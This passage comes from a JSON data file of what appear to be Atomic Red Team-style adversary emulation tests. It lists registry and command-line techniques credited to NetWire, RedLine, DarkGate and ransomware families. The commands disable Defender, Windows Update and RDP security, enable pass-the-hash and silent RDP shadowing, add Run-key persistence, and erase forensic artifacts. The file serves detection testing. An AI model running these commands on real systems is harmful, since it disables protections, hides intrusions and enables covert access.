        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific\nuser to rdp connect on the targeted machine.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1524,
        "Command": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f\nreg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f\nreg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f\n",
        "Description": "NetWire continues to create its home key (HKCU\\SOFTWARE\\NetWire) as well as adding it into the auto-run group in the victim’s registry.\nSee how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1525,
        "Command": "reg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f\n",
        "Description": "Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\\nMore information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1526,
        "Command": "reg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" /va /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers\" /f\n",
        "Description": "The built-in Windows Remote Desktop Connection (RDP) client (mstsc.exe) saves the remote computer name (or IP address) and the username that is used to login after each successful connection to the remote computer\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1527,
        "Command": "reg add HKLM64\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable windows error reporting settings. This Windows feature allow the use to report bug, errors, failure or problems \nencounter in specific application or process.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1528,
        "Command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art1 /d \"regedit.exe\"\nreg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /f /t REG_SZ /v art2 /d \"cmd.exe\"\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it \nusing security product.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1529,
        "Command": "reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0\n",
        "Description": "Enabling Restricted Admin Mode via Command_Prompt,enables an attacker to perform a pass-the-hash attack using RDP.\n\nSee [Passing the Hash with Remote Desktop](https://www.kali.org/blog/passing-hash-remote-desktop/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1530,
        "Command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Winlogon /t REG_DWORD /v AllowMultipleTSSessions /d 1 /f\n",
        "Description": "This test emulates Mimic ransomware's ability to enable multiple user sessions by modifying the AllowMultipleTSSessions value within the Winlogon registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1531,
        "Command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\n",
        "Description": "This test emulates Mimic ransomware's ability to enable multiple RDP sessions per user by modifying the fSingleSessionPerUser value within the Terminal Server registry key. \nSee [Mimic Ransomware Overview] (https://www.trendmicro.com/en_us/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1532,
        "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionURL /t REG_SZ /d \"file://C:\\windows\\system32\\notepad.exe\" /f",
        "Description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will open the URL or execute the program defined in the redirection URL registry entry.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1533,
        "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Event Viewer\" /v MicrosoftRedirectionProgram /t REG_EXPAND_SZ /d \"C:\\windows\\system32\\notepad.exe\" /f",
        "Description": "Modify event viewer registry values to alter the behavior of the online help redirection. Upon opening an event in event viewer and attempting to view the help page for the event, it will execute the program defined in the redirection program registry entry.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1534,
        "Command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f\n",
        "Description": "Enabling RDP through remote registry.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1535,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications\" /v \"DisableNotifications\" /t REG_DWORD /d 1 /f\n",
        "Description": "Disable Win Defender Notification. Redline is using this to disable this win defender feature.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1536,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f\n",
        "Description": "Disable Auto Update Windows OS feature. Redline is using this as part of its defense evasion.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1537,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoRebootWithLoggedOnUsers\" /t REG_DWORD /d 1 /f\n",
        "Description": "Disable Windows Auto Reboot for current logon user. Redline is using this as part of its defense evasion.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1538,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"AUOptions\" /t REG_DWORD /d 2 /f\n",
        "Description": "Windows Auto Update Option to Notify before download. Redline is using this as part of its defense evasion.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1539,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" /v \"DoNotConnectToWindowsUpdateInternetLocations\" /t REG_DWORD /d 1 /f\n",
        "Description": "Do Not Connect To Win Update. Redline is using this as part of its defense evasion.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1540,
        "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\" /t REG_DWORD /d 0 /f\n",
        "Description": "Tamper Win Defender Protection. RedLine Stealer is executing another component file to modify this win defender feature in registry. \nTake note that this modification might not be enough to disable this feature but can be a good indicator of malicious process that \ntries to tamper this Win Defender feature settings.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1541,
        "Command": "$typicalPath = \"HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds\"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name \"AtomicSnake\" -Value $randomBytes -PropertyType Binary -Force | Out-Null\n",
        "Description": "The following Atomic Test creates a registry blob in HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds, which is related to Snake Malware. Per the report, upon execution, Snake's WerFault.exe will attempt to decrypt an encrypted blob within the Windows\nregistry that is typically found at HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds. The encrypted data includes the AES key, IV, and path that is used to find and decrypt the file containing Snake's kernel driver and kernel driver loader.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "powershell"
    },
    {
        "ID": 1542,
        "Command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPerServer\" /t REG_DWORD /d 10 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v \"MaxConnectionsPer1_0Server\" /t REG_DWORD /d 10 /f\n",
        "Description": "A registry modification to allow Simultaneous download in the system.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1543,
        "Command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F\n",
        "Description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using the reg.exe utility via the command prompt. Such modifications can be indicative of an adversary trying to weaken browser security settings. Upon execution, if successful, the message \"The operation completed successfully.\" will be displayed.\nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```batch\nreg query \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\"\n```\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1544,
        "Command": "# Set the registry values for http and https to 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 0\n",
        "Description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using PowerShell. Such modifications can be indicative of an adversary attempting to weaken browser security settings. \nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```powershell\nGet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' | Select-Object http,https\n```\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "powershell"
    },
    {
        "ID": 1545,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 0 /f\n",
        "Description": "Detect the disable secondary authentication activities that adversary attempt to bypass MFA and to get the unauthorized access to the system or sensitive data.\nSee the related article (https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.SecondaryAuthenticationFactor::MSSecondaryAuthFactor_AllowSecondaryAuthenticationDevice).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1546,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 0 /f\n",
        "Description": "Detect the Microsoft FIDO authentication disable activities that adversary attempt to gains access to login credentials (e.g., passwords), they may be able to impersonate the user and access sensitive accounts or data and also increases the risk of falling victim to phishing attacks.\nSee the related article (https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.FidoAuthentication::AllowFidoDeviceSignon).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1547,
        "Command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f\n",
        "Description": "Scarab Ransomware defense evasion activities that can abuse the registry values to modify the settings of the Credential Security Support Provider to overcome potential RDP connection issues.\n[Scarab Ransomware Article](https://www.welivesecurity.com/en/eset-research/scarabs-colon-izing-vulnerable-servers/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1548,
        "Command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableRemoteDesktopAntiAlias\" /t REG_DWORD /d 1 /f\n",
        "Description": "A modification registry to disable RDP anti-alias settings. This technique was seen in DarkGate malware as part of its installation\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1549,
        "Command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD /d 1 /f\n",
        "Description": "A modification registry to disable RDP security settings. This technique was seen in DarkGate malware as part of its installation\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1550,
        "Command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 1 /f\n",
        "Description": "A modification registry to disable ShowUI settings of Windows Error Report. This registry setting can influence the behavior of error reporting dialogs or prompt box. \nThis technique was seen in DarkGate malware as part of its installation.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1551,
        "Command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f\n",
        "Description": "A modification registry to enable proxy settings. This technique was seen in DarkGate malware as part of its installation.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1552,
        "Command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /t REG_SZ /d \"proxy.atomic-test.com:8080\" /f\n",
        "Description": "A modification registry to setup proxy server. This technique was seen in DarkGate malware as part of its installation.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1553,
        "Command": "reg add \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f\n",
        "Description": "A modification registry to override RDP Authentication Level. This technique was seen in DarkGate malware as part of its installation.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1554,
        "Command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
        "Description": "Modify the registry value of fDenyTSConnections to allow incoming RDP connections. \nThis activity has been observed by multiple ransomware groups, including Hive ransomware. \n[Reference](https://www.rapid7.com/blog/post/2023/01/11/increasing-the-sting-of-hive-ransomware/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1555,
        "Command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d 0 /f\n",
        "Description": "Modify the registry of the machine to disable prefetch. Disabling prefetch will remove one artifact for evidence of application execution. Restart is required post modification\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1556,
        "Command": "$s= New-CimSession -Computername localhost -SessionOption (New-CimSessionOption -Protocol Dcom)\nGet-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=\"Remote Desktop - Shadow (TCP-In)\"' -CimSession $s | Invoke-CimMethod -MethodName Enable\nInvoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"shadow\"; uValue=[uint32]2} -CimSession $s",
        "Description": "Microsoft Remote Desktop Protocol (RDP) supports a “shadowing” feature and RDP is available in all Windows Server Operating Systems and the business editions of end-user Windows versions.\nIn order to use the RDP shadowing feature, the Remote Desktop Services (TermService) service needs to be running (which it does by default), a rule needs to be enabled in the Windows Firewall and in case of stealth reasons, a setting needs to be configured to not prompt the user for permission when they are being shadowed.\nIn order to configure RDP shadowing session in a quiet mode.  The registry of a remote system can be updated using several protocols, depending on the accessible ports and configuration of the services listening on those ports. Our aim is to set the Shadow value in HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services on the remote machine to 2, which allows us to both view and control the session without the user being informed.\n[Reference](https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "powershell"
    },
    {
        "ID": 1557,
        "Command": "Rundll32.exe apphelp.dll,ShimFlushCache",
        "Description": "The ShimCache is a component in Windows operating systems that stores information about recently executed applications. It is used by the operating system to speed up the launching process of applications. The ShimCache is also used by IR teams and Forensic teams. Forensic investigators can use the ShimCache to determine which programs have been executed on a system, even if they have been deleted or their logs have been cleared.Reference : https://blueteamops.medium.com/shimcache-flush-89daff28d15e",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1558,
        "Command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the machine to disable remote desktop protocol.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1559,
        "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v scforceoption /t REG_DWORD /d 1 /f\n",
        "Description": "Enforce Smart Card Authentication Through Registry\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1560,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseAdvancedStartup /t REG_DWORD /d 1 /f\n",
        "Description": "Requires the BitLocker PIN for Pre-boot authentication\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1561,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f\n",
        "Description": "Allow BitLocker without a compatible TPM (requires a password)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1562,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPM /t REG_DWORD /d 2 /f\n",
        "Description": "Use Trusted Platform Module (TPM) for Bitlocker tool\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1563,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMPIN /t REG_DWORD /d 2 /f\n",
        "Description": "Allow startup PIN with TPM for Bitlocker tool\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1564,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKey /t REG_DWORD /d 2 /f\n",
        "Description": "Allow startup key with TPM for Bitlocker tool\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1565,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f\n",
        "Description": "Allow startup key and PIN with TPM for Bitlocker tool\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1566,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableNonTPM /t REG_DWORD /d 1 /f\n",
        "Description": "Allow Bitlocker without TPM for Bitlocker tool\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1567,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f\n",
        "Description": "Allow startup key with TPM for Bitlocker tool\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1568,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePIN /t REG_DWORD /d 2 /f\n",
        "Description": "Allow startup PIN with TPM for Bitlocker tool\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1569,
        "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\NewKey\" /t REG_SZ /v Command /d C:\\Windows\\System32\\notepad.exe /f\n",
        "Description": "The Windows Compatibility Telemetry system makes use of the CompatTelRunner.exe binary to run a variety of telemetry tasks. It relies on the registry for instructions on which commands to run. \nIt will run any arbitrary command without restriction of location or type. Blog :https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1570,
        "Command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v fInheritInitialProgram /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v InitialProgram /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f\n",
        "Description": "If the fInheritInitialProgram value is set to 1, the exe indicated in the InitialProgram value is automatically started on RDP connection.\nOnce the test commands are run, notepad will execute automatically on new RDP connection\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1571,
        "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
        "Description": "Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1572,
        "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\DefragPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
        "Description": "Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1573,
        "Command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\BackupPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
        "Description": "Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1574,
        "Command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe\" /t REG_SZ /d C:\\Windows\\System32\\notepad.exe /f\n",
        "Description": "As per Microsoft,the entries found under App Paths are used primarily to map an application’s executable file name to that file’s fully qualified path and to pre-pend information to the PATH environment variable on a per-application, per-process basis. \nThe path can be modified to load a custom application of choice. \nPost the registry changes of this test, when someone tries to manually run msedge.exe via StartMenu/Run window , notepad will be launched.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1575,
        "Command": "Start-Process \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1059.003_script.bat\"\n",
        "Description": "Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.003",
        "Shell": "powershell"
    },
    {
        "ID": 1576,
        "Command": "echo \"Hello from the Windows Command Prompt!\" > \"%TEMP%\\test.bin\" & type \"%TEMP%\\test.bin\"\n",
        "Description": "Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1577,
        "Command": "%LOCALAPPDATA:~-3,1%md /c echo Hello, from CMD! > hello.txt & type hello.txt\n",
        "Description": "Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1578,
        "Command": "cmd /c \"for /l %x in (1,1,75) do start wordpad.exe /p PathToAtomicsFolder\\..\\ExternalPayloads\\T1059_003note.txt\" | out-null\n",
        "Description": "This test attempts to open a file a specified number of times in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.003",
        "Shell": "powershell"
    },
    {
        "ID": 1579,
        "Command": "cmd /r cmd<\"PathToAtomicsFolder\\T1059.003\\src\\t1059.003_cmd.cmd\"\n",
        "Description": "Simulate Raspberry Robin using the \"standard-in\" command prompt feature cmd `/R <` to read and execute a file via cmd.exe\nSee https://redcanary.com/blog/raspberry-robin/. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059.003",
        "Shell": "command_prompt"
    },
    {
        "ID": 1580,
